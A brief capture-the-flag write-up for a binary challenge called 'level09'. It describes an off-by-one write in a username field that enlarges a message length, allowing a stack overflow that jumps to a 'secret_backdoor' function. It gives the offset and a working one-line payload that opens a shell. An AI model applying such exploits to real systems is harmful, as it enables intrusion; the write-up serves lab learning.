# ROP

## Protection

RELRO | STACK CANARY | NX | PIE
--- | --- | --- | --- 
**Partial** | No Canary | **NX enable** | **PIE**

## Context:

```bash
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: gottie
>: Welcome, gottie
>: Msg @Unix-Dude
>>: ok
>: Msg sent!
```

Main() call function handle_msg which sub 0xc0 (192) in the stack:

```py
   0x00005555554008c4 <+4>:	sub    rsp,0xc0
```

This sub seems contains serverals informations:

start of the buffer | name | size
--- | --- | ---
0x0 -- 0x8c (140) | buffer_msg | 140
0x8c -- 0xb4 (180) | buffer_name | 40
0xb4 -- 0xb8 (188) | len_msg | 8

:warning: Len_msg = int set to 0x8c (140)
	0x00005555554008ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c

size of struct = 192 and not 188 because of stack alignement.

```c
188/8 = 23,5
192/8 = 24
```

## Exploit

set_username read 41 byte and not 40, so it overwrite len_msg. If we modifie len_msg we can write more than 140 byte, and overwrite eip of handle_msg

Found offset :

```py
Found at offset 286 (little-endian search) likely
```

Paylaod = padding name (40) + 0xff (size maxe of a byte) + offset + secret_backdore() + /bin/sh

```py
info func secret_backdoor
0x000055555555488c  secret_backdoor
```

```bash
cat <(python2.7 -c 'import sys; sys.stdout.write(b"A" * 40 + b"\xff" + b"B" * 286 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + b"/bin/sh" )') - | ./level09
```